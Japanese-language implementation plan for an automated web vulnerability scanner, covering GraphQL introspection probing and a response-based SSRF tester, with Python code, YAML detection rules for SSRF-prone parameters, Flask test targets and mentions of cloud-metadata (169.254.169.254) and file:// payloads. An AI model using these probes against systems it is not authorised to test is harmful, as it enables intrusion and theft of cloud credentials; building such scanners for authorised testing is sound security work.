- [x] `try/finally` で接続リーク防止（`conn.close()`）
- [x] `resp.read()` でボディ消費（`ResponseNotReady` 防止）

**統合層**
- [x] `VulnType.CRLF_INJECTION` が `VulnType` enum に存在する（既存定義流用 → D7）
- [x] `SmartCRLFHunter` が `specialists["crlf"]` に登録される
- [x] `run_crlf_hunter()` 直接呼び出し時の `KeyError` ガードがある
- [x] `_classify_url("crlf_candidate")` が `"crlf"` を返す（評価順序修正 → D6）
- [x] `crlf_candidate` の評価が `redirect_param` より前にある（D6）
- [x] `_build_unknown_hypotheses()` に `crlf_keys` と `crlf_signal` 生成ロジックがある（D5）
- [x] `Finding.additional_info` に `poc_request` / `poc_response` / `poc_html` が存在する
- [x] `Evidence` オブジェクトが Finding に設定されている
- [x] `PER_URL_TIMEOUT_BY_TYPE["crlf"] = 90` が設定されている

**レポーター層**
- [x] `haddix_formatter._cia_impact_assessment()` に CRLF 固有ブランチがある
- [x] `haddix_formatter._remediation()` に CRLF 固有ブランチがある
- [x] `confidence >= 0.5` + `poc_request` あり → suppress されない

**テスト**
- [x] L1: `test_smart_crlf.py` 11件 GREEN
- [x] L2: `test_smart_crlf.py` (Flask port 15557) 3件 GREEN
- [x] L3: `test_crlf_classification.py` 20件 GREEN（`_classify_url` / `_build_unknown_hypotheses` / specialist登録）
- [x] L4: `test_crlf_pipeline.py` 13件 GREEN（`run_crlf_hunter` → context格納 / dispatch経路 / Haddix出力）
- [x] 回帰テスト 97件 GREEN（既存機能への破壊なし）
- [x] `crlf_flask_target.py` に `__main__` ブロックあり（手動起動可）

---

## B-1: GraphQL Introspection 実実装

### 現状

`GraphQLAnalyzer._try_introspection()` が `return None` のプレースホルダー。  
`_parse_schema()`, `_find_sensitive_fields()`, `_suggest_attack_vectors()` は完成済み。  
INTROSPECTION_QUERY 定義済み。  
InjectionManager への接続経路なし。

### スコープ外

- GraphQL Injection（SQLi/SSTI等の文字列インジェクション）— 別途実装
- バッチクエリ攻撃・DoSテスト（`is_aggressive=False` 方針）
- Subscription/WebSocket経由のGraphQL

---

### タスク B1-1: `GraphQLAnalyzer._try_introspection()` 実装

**ファイル**: `src/core/attack/graphql_analyzer.py`

```python
import httpx

class GraphQLAnalyzer:
    TIMEOUT = 15

    def __init__(self, auth_headers: Optional[Dict] = None):
        self.auth_headers = auth_headers or {}
        self.results: List[GraphQLAnalysisResult] = []

    def _try_introspection(self, endpoint: str) -> Optional[Dict]:
        headers = {
            **self.auth_headers,
            "Content-Type": "application/json",
        }
        payload = {"query": INTROSPECTION_QUERY}
        
        try:
            with httpx.Client(timeout=self.TIMEOUT) as client:
                response = client.post(endpoint, json=payload, headers=headers)
        except Exception as exc:
            logger.warning("GraphQL introspection request failed: %s", exc)
            return None

        if not response.is_success:
            return None

        try:
            data = response.json()
        except Exception:
            return None

        schema = data.get("data", {}).get("__schema")
        if schema:
            return schema

        # エラーレスポンスでも introspection 無効の証拠として記録
        errors = data.get("errors", [])
        if errors:
            logger.info("GraphQL introspection disabled or errored: %s", errors[:1])
        return None

    async def analyze_async(self, endpoint: str,
                             auth_headers: Optional[Dict] = None) -> GraphQLAnalysisResult:
        import asyncio
        if auth_headers:
            self.auth_headers = auth_headers
        return await asyncio.to_thread(self.analyze, endpoint)
```

---

### タスク B1-2: `SmartGraphQLHunter` 新規作成

**新規ファイル**: `src/core/agents/swarm/injection/smart_graphql.py`

```python
class SmartGraphQLHunter(Specialist):
    name = "SmartGraphQLHunter"
    description = "GraphQL introspection and schema exposure detector"
    timeout_seconds = 120
    is_aggressive = False
```

`run_as_tool()` 返却形式:
```python
{
    "vulnerable": bool,          # introspection_enabled と同値
    "findings_count": int,
    "tested_params": [],         # GraphQL はパラメータベースでない
    "introspection_enabled": bool,
    "sensitive_fields": List[str],
    "mutations": List[str],
    "attack_vectors": List[str],
}
```

Finding: `VulnType.GRAPHQL_INTROSPECTION`（未定義なら追加）, `Severity.MEDIUM`  
Sensitive fields が存在する場合 → `Severity.HIGH`

---

### タスク B1-3: `tagging_rules.yaml` に GraphQL ルール追加

```yaml
  - name: graphql_path_hint
    tag: graphql_candidate
    match_on: path
    pattern: "(graphql|gql|graph|api/graph)"

  - name: graphql_param_hint
    tag: graphql_candidate
    match_on: query
    pattern: "(^|[?&])(query|mutation|operationName)="
    param_extract: 2
```

---

### タスク B1-4: InjectionManager 配線

```python
# 1. PER_URL_TIMEOUT_BY_TYPE
"graphql": 120,

# 2. _classify_url()
if category_hint == "graphql_candidate":
    return "graphql"
# パスヒューリスティック（既存より前）
if "/graphql" in path or "/gql" in path:
    return "graphql"

# 3. _initialize_specialists() / _register_manager_tools()
# SmartGraphQLHunter / "graphql_scan"

# 4. _run_unknown_hypothesis_scans() に graphql 分岐

# 5. _resolve_risk_force_allowlist() に "graphql" 追加
```

---

### タスク B1-5: ReconPipeline 統合

```python
"graphql_candidate": {
    "agent_type": "InjectionManagerAgent",
    "priority": 72,
    "vuln_type": "graphql",
    "description": "GraphQL Introspection有効確認",
},
```

---

### タスク B1-6: テスト

**新規ファイル**: `tests/core/agents/swarm/injection/test_smart_graphql.py`  
**新規ファイル**: `tests/helpers/graphql_flask_target.py`

#### L2 Flask ターゲット

```python
# tests/helpers/graphql_flask_target.py
from flask import Flask, request, jsonify

def create_app() -> Flask:
    app = Flask(__name__)

    # 簡易スキーマ（introspection有効）
    SCHEMA_RESPONSE = {
        "data": {
            "__schema": {
                "queryType": {"name": "Query"},
                "mutationType": None,
                "subscriptionType": None,
                "types": [
                    {
                        "kind": "OBJECT",
                        "name": "Query",
                        "description": None,
                        "fields": [
                            {
                                "name": "getUser",
                                "description": None,
                                "args": [{"name": "id"}],
                                "type": {"kind": "OBJECT", "name": "User", "ofType": None},
                                "isDeprecated": False,
                                "deprecationReason": None,
                            },
                            {
                                "name": "getPassword",
                                "description": "Sensitive field",
                                "args": [],
                                "type": {"kind": "SCALAR", "name": "String", "ofType": None},
                                "isDeprecated": False,
                                "deprecationReason": None,
                            },
                        ],
                        "inputFields": None,
                        "interfaces": [],
                        "enumValues": None,
                        "possibleTypes": None,
                    }
                ],
                "directives": [],
            }
        }
    }

    @app.route("/graphql", methods=["POST"])
    def graphql_vulnerable():
        return jsonify(SCHEMA_RESPONSE)

    @app.route("/graphql-disabled", methods=["POST"])
    def graphql_disabled():
        return jsonify({"errors": [{"message": "Introspection disabled"}]}), 200

    return app
```

**テストポート**: `15558`

#### L1 テストケース一覧

| テスト名 | 検証内容 |
|---|---|
| `test_execute_returns_finding_when_introspection_enabled` | 有効 → Finding生成 |
| `test_execute_returns_empty_when_introspection_disabled` | 無効 → 空リスト |
| `test_finding_severity_high_with_sensitive_fields` | 機密フィールドあり → HIGH |
| `test_finding_severity_medium_without_sensitive_fields` | 機密フィールドなし → MEDIUM |
| `test_finding_has_schema_info_in_additional_info` | スキーマ情報が記録される |
| `test_run_as_tool_initializes_result_shape` | 返却dict形状 |
| `test_auth_headers_forwarded_to_analyzer` | auth cookies が渡る |

---

### B-1 完了チェックリスト

- [ ] `GraphQLAnalyzer._try_introspection()` がhttpxでPOST送信する
- [ ] `GraphQLAnalyzer.analyze_async()` が非同期で呼べる
- [ ] `VulnType.GRAPHQL_INTROSPECTION` が `VulnType` enumに存在する
- [ ] `SmartGraphQLHunter` が `specialists["graphql"]` に登録される
- [ ] Sensitive fields検出時に `Severity.HIGH` になる
- [ ] L1 7件 GREEN
- [ ] L2 3件 GREEN
- [ ] 回帰テスト全 GREEN

---

## B-2: SSRF 単体 Tester 実実装

### 現状

`SSRFTester._test_payload()` が `return None` のプレースホルダー。  
ペイロードリスト・`_analyze_response()` は完成済み。  
`SmartCmdSSRFHunter` は別系統として既に稼働中（`cmd_ssrf`）。  
今回は `SSRFTester` 単体の HTTP 応答ベース検出を実装する。

### スコープ外

- OOB（DNS/HTTP コールバック）検出 — `LocalOOBListener` との連携は将来フェーズ
- クラウドメタデータへの実際のアクセス（スキャン対象環境外への送信）
- file:// プロトコルの実送信（対象サーバ側での実行のため検出のみ）

### SmartCmdSSRFHunter との関係

既存の `SmartCmdSSRFHunter`（`specialists["cmd_ssrf"]`）は LLM+OOB を使ったコマンドインジェクション/SSRF ハイブリッド実装。  
今回の `SmartSSRFHunter` は **httpx 応答ベースの決定論的 SSRF 検出** として独立した別エントリポイントで実装する。  
タイプキー: `"ssrf"` を新設（`"cmd_ssrf"` と競合しない）。

---

### タスク B2-1: `SSRFTester._test_payload()` 実装

**ファイル**: `src/core/attack/ssrf_tester.py`

```python
import httpx

class SSRFTester:
    TIMEOUT = 10

    def __init__(self, auth_headers: Optional[Dict] = None):
        self.auth_headers = auth_headers or {}
        self.results: List[SSRFResult] = []

    def _test_payload(self, url: str, parameter: str,
                       payload: str, payload_type: SSRFPayloadType) -> Optional[SSRFResult]:
        headers = dict(self.auth_headers)
        try:
            with httpx.Client(timeout=self.TIMEOUT, follow_redirects=True) as client:
                response = client.get(url, params={parameter: payload}, headers=headers)
        except httpx.TimeoutException:
            # タイムアウト自体が内部SSRFの証拠になりうる
            return SSRFResult(
                url=url, parameter=parameter, payload=payload,
                payload_type=payload_type, vulnerable=False,
                response_code=0, evidence="timeout",
            )
        except Exception:
            return None

        vuln = self._analyze_response(response.text, payload_type)
        return SSRFResult(
            url=url, parameter=parameter, payload=payload,
            payload_type=payload_type,
            vulnerable=vuln,
            response_code=response.status_code,
            response_length=len(response.content),
            evidence=response.text[:200] if vuln else "",
            severity="high",
        )

    async def scan_async(self, url: str, parameters: List[str],
                          auth_headers: Optional[Dict] = None) -> List[SSRFResult]:
        import asyncio
        if auth_headers:
            self.auth_headers = auth_headers
        return await asyncio.to_thread(self.test, url, parameters)
```

> **重要**: クラウドメタデータ URL（169.254.169.254等）への実リクエストは、  
> 実際のクラウド環境上で動作しているターゲットにのみ有効。  
> 内部環境での誤検知を防ぐため、レスポンスボディの `VULN_INDICATORS` マッチを必須とする。

---

### タスク B2-2: `SmartSSRFHunter` 新規作成

**新規ファイル**: `src/core/agents/swarm/injection/smart_ssrf.py`

```python
class SmartSSRFHunter(Specialist):
    name = "SmartSSRFHunter"
    description = "Deterministic SSRF detector using response-based analysis"
    timeout_seconds = 180
    is_aggressive = False
```

`run_as_tool()` 返却形式:
```python
{
    "vulnerable": bool,
    "findings_count": int,
    "tested_params": List[str],
    "payload_type": str,
    "payload": str,
    "evidence": str,
    "response_code": int,
}
```

Finding: `VulnType.SSRF`, `Severity.HIGH`

> **注意**: `VulnType.SSRF` は既存の SmartCmdSSRFHunter と異なる可能性がある。  
> 既存 `VulnType` を確認し、適切なものを選択すること。

---

### タスク B2-3: `tagging_rules.yaml` に SSRF ルール追加

```yaml
  - name: ssrf_param_hint
    tag: ssrf_candidate
    match_on: query
    pattern: "(^|[?&])(url|uri|endpoint|host|target|dest|destination|src|source|path|fetch|load|remote|request|webhook|callback)="
    param_extract: 2

  - name: ssrf_body_hint
    tag: ssrf_candidate
    match_on: body
    pattern: "(^|&)(url|uri|endpoint|host|target|dest|destination|src|source|path|fetch|load|remote|request|webhook|callback)="
    param_extract: 2
```

---

### タスク B2-4: InjectionManager 配線

```python
# 1. PER_URL_TIMEOUT_BY_TYPE
"ssrf": 180,

# 2. _classify_url()
if category_hint == "ssrf_candidate":
    return "ssrf"
# 注意: "cmd_ssrf" 判定より前に "ssrf_candidate" をチェックする

# 3. _initialize_specialists() / _register_manager_tools()
# SmartSSRFHunter / "ssrf_scan"

# 4. _build_unknown_hypotheses() ssrf仮説追加
ssrf_keys = {"url", "uri", "endpoint", "host", "target", "dest", "src", "fetch", "webhook"}
if any(kw in path for kw in ["fetch", "proxy", "redirect"]) \
    or (all_param_keys & ssrf_keys):
    hypotheses.append("ssrf")
    signals.append("ssrf_signal")

# specialist_map に "ssrf": "ssrf" 追加

# 5. _run_unknown_hypothesis_scans() に ssrf 分岐

# 6. _resolve_risk_force_allowlist() に "ssrf" 追加
```

---

### タスク B2-5: ReconPipeline 統合

```python
"ssrf_candidate": {
    "agent_type": "InjectionManagerAgent",
    "priority": 80,
    "vuln_type": "ssrf",
    "description": "SSRF脆弱性の応答ベーススキャン",
},
```

---

### タスク B2-6: テスト

**新規ファイル**: `tests/core/agents/swarm/injection/test_smart_ssrf.py`  
**新規ファイル**: `tests/helpers/ssrf_flask_target.py`

#### L2 Flask ターゲット

```python
# tests/helpers/ssrf_flask_target.py
from flask import Flask, request
import httpx

def create_app() -> Flask:
    app = Flask(__name__)

    @app.route("/fetch")
    def vulnerable():
        """urlパラメータを取得してフェッチ（SSRF脆弱）"""
        target = request.args.get("url", "")
        if not target:
            return "no url", 400
        try:
            # 内部フェッチをシミュレート
            # テスト環境では実際にリクエストせず、URLをそのままエコー
            return f"Fetched: {target}", 200
        except Exception:
            return "error", 500

    @app.route("/safe")
    def safe():
        return "safe", 200

    return app
```

> **テスト設計注意**: SSRFは実際に外部URLをフェッチする環境でないと検出が難しい。  
> L2テストは `_analyze_response()` へのモックを使った単体確認を優先する。  
> 実クラウド環境テストは L5（実環境）スコープとして切り離す。

**テストポート**: `15559`

#### L1 テストケース一覧

| テスト名 | 検証内容 |
|---|---|
| `test_execute_returns_finding_when_vulnerable` | レスポンスに証拠 → Finding生成 |
| `test_execute_returns_empty_when_safe` | 証拠なし → 空リスト |
| `test_finding_severity_is_high` | SSRF は HIGH |
| `test_finding_has_payload_type_in_additional_info` | ペイロードタイプが記録される |
| `test_tested_params_excludes_control_params` | META_KEYS除外 |
| `test_run_as_tool_initializes_result_shape` | 返却dict形状 |
| `test_auth_headers_forwarded_to_tester` | auth cookies が渡る |

---

### B-2 完了チェックリスト

- [ ] `SSRFTester._test_payload()` がhttpxで実動作する
- [ ] `SSRFTester.scan_async()` が非同期で呼べる
- [ ] `VulnType.SSRF` が `VulnType` enumに存在する（既存確認）
- [ ] `SmartSSRFHunter` が `specialists["ssrf"]` に登録される
- [ ] `SmartCmdSSRFHunter` ("cmd_ssrf") への影響がない
- [ ] L1 7件 GREEN
- [ ] L2 確認 GREEN
- [ ] 回帰テスト全 GREEN

---

## 共通事前確認事項

各フェーズ開始前に以下を確認すること:

### VulnType enum の確認

**ファイル**: `src/core/domain/finding.py`（推定）

以下が存在するか確認し、なければ追加する:

| フェーズ | 必要な VulnType |
|---|---|
| A-2 | `VulnType.CORS` |
| A-3 | `VulnType.CRLF` |
| B-1 | `VulnType.GRAPHQL_INTROSPECTION`（または類似） |
| B-2 | `VulnType.SSRF`（SmartCmdSSRFHunter の既存値を確認） |

### httpx インポート重複チェック

各 tester ファイルに `import httpx` が既に存在するか確認すること（`ssti_scanner.py` 同様）。

### Flask ターゲットのポート一覧（衝突防止）

| フェーズ | Flask ターゲットファイル | ポート |
|---|---|---|
| A-1（完了） | `ssti_flask_target.py` | 15555 |
| A-2 | `cors_flask_target.py` | 15556 |
| A-3 | `crlf_flask_target.py` | 15557 |
| B-1 | `graphql_flask_target.py` | 15558 |
| B-2 | `ssrf_flask_target.py` | 15559 |

---

## 回帰テストコマンド（各フェーズ完了時）

```bash
# 対象フェーズのテスト（例: A-2 CORS）
.venv/bin/pytest tests/core/agents/swarm/injection/test_smart_cors.py -v

# 回帰テスト（全スペシャリスト）
.venv/bin/pytest \
  tests/test_ssti_scanner.py \
  tests/core/agents/swarm/test_injection_manager.py \
  tests/core/agents/swarm/injection/test_smart_lfi.py \
  tests/core/agents/swarm/test_smart_cmd_ssrf.py \
  tests/core/agents/swarm/test_smart_xss.py \
  -v

# 統合テストのみ
.venv/bin/pytest -m integration -v
```

---

## ファイル変更一覧（全フェーズ）

| ファイル | 変更種別 | フェーズ |
|---|---|---|
| `src/core/attack/cors_tester.py` | 修正 | A-2 |
| `src/core/attack/crlf_tester.py` | 修正 | A-3 |
| `src/core/attack/graphql_analyzer.py` | 修正 | B-1 |
| `src/core/attack/ssrf_tester.py` | 修正 | B-2 |
| `src/core/agents/swarm/injection/smart_cors.py` | **新規** | A-2 |
| `src/core/agents/swarm/injection/smart_crlf.py` | **新規** | A-3 |
| `src/core/agents/swarm/injection/smart_graphql.py` | **新規** | B-1 |
| `src/core/agents/swarm/injection/smart_ssrf.py` | **新規** | B-2 |
| `config/tagging_rules.yaml` | 修正（各フェーズで追記） | A-2/A-3/B-1/B-2 |
| `src/core/agents/swarm/injection/manager.py` | 修正（各フェーズで追記） | A-2/A-3/B-1/B-2 |
| `src/recon/pipeline.py` | 修正（各フェーズで追記） | A-2/A-3/B-1/B-2 |
| `src/core/domain/finding.py` | 修正（VulnType追加） | A-2/A-3/B-1/B-2 |
| `tests/core/agents/swarm/injection/test_smart_cors.py` | **新規** | A-2 |
| `tests/core/agents/swarm/injection/test_smart_crlf.py` | **新規** | A-3 |
| `tests/core/agents/swarm/injection/test_smart_graphql.py` | **新規** | B-1 |
| `tests/core/agents/swarm/injection/test_smart_ssrf.py` | **新規** | B-2 |
| `tests/helpers/cors_flask_target.py` | **新規** | A-2 |
| `tests/helpers/crlf_flask_target.py` | **新規** | A-3 |
| `tests/helpers/graphql_flask_target.py` | **新規** | B-1 |
| `tests/helpers/ssrf_flask_target.py` | **新規** | B-2 |

---

## 既知のリスクと注意点

| リスク | 対象 | 対処方針 |
|---|---|---|
| httpx が CRLF シーケンスを自動サニタイズする | A-3 | `http.client` フォールバック、L2テストで必ず検証 |
| CORS の `match_on: response_headers` が TaggingFilter 未対応 | A-2 | パスヒューリスティックのみで代替 |
| SSRF の実検出が内部環境でほぼ機能しない | B-2 | L2はモックで代替、実クラウドは L5 スコープ |
| `VulnType.SSRF` と `SmartCmdSSRFHunter` の型競合 | B-2 | 既存 `VulnType` を先に調査してから実装 |
| GraphQL エンドポイント検出がパスのみでは誤検知 | B-1 | `graphql_candidate` 分類時のみスキャン実行 |
| `crlf_candidate` と `redirect` タグの競合 | A-3 | `_classify_url()` で `crlf_candidate` を先に評価 |

---

*作成: 2026-05-15*  
*最終更新: 2026-05-16（A-2 完了）*  
*参照実装: `docs/plans/2026-05-14_ssti_docs/shigoku/plans/file_upload_implementation_plan_legacy.md`*  
*標準仕様: `docs/standards/vulnerability_feature_implementation_spec.md`*

---

## A-2 実施後フィードバック（次フェーズへの申し送り）

計画書・仕様書に記載がなく、実装中・テスト中に追加指摘が必要だった項目。
**これらを仕様書に反映済み（2026-05-16）**。A-3以降では再発しないはず。

| # | 発覚タイミング | 内容 | 仕様書反映先 |
|---|---|---|---|
| 1 | 実装後 | `classify()` の `response_headers` キー不一致バグ（フラット vs ネスト） | §2.5 注意事項 |
| 2 | スモークテスト | `run_cors_hunter()` 直接呼び出し時の `KeyError: 'findings'` | §2.3C |
| 3 | レポーター確認 | `poc_request`/`poc_response` を `additional_info` に格納する必要がある | §2.4 |
| 4 | レポーター確認 | `haddix_formatter` に CORS 固有 CIA 評価・修正方針ブランチが必要 | §2.7（新設） |
| 5 | レポーター確認 | `HaddixFinding` 構築時の `additional_info` フォールバックが必要 | §2.7（新設） |
| 6 | 手動確認 | Flask ターゲットに `__main__` ブロックが必要（手動起動できない） | §2.6 |
| 7 | テスト設計 | Haddix formatter 向けテスト（L4相当）が未定義だった | §2.6 テスト一覧 |
| 8 | VulnType | 計画書のファイルパス推定が誤り（`domain/` ではなく `models/`） | §2.0 共通事前確認 |
